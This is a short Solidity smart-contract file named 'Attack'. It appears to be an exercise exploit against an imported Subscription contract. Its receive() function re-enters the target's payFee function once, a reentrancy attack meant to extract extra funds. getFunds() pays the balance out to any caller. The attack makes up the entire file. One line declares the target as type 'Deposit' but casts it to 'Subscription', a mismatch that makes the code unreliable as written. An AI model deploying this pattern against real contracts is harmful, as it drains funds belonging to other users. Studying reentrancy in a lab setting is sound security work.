// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./Subscription.sol";


contract Attack {
    Deposit depos;
    address payable public owner;
    bool attacked = false;

    constructor(address payable _addr) public {
        depos = Subscription(_addr);
        owner = msg.sender;
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function getFunds() public {
        msg.sender.transfer(address(this).balance);
    }

    receive() external payable {   
        if (!attacked) {
            attacked = true;
            depos.payFee(address(this));
        }
    }
}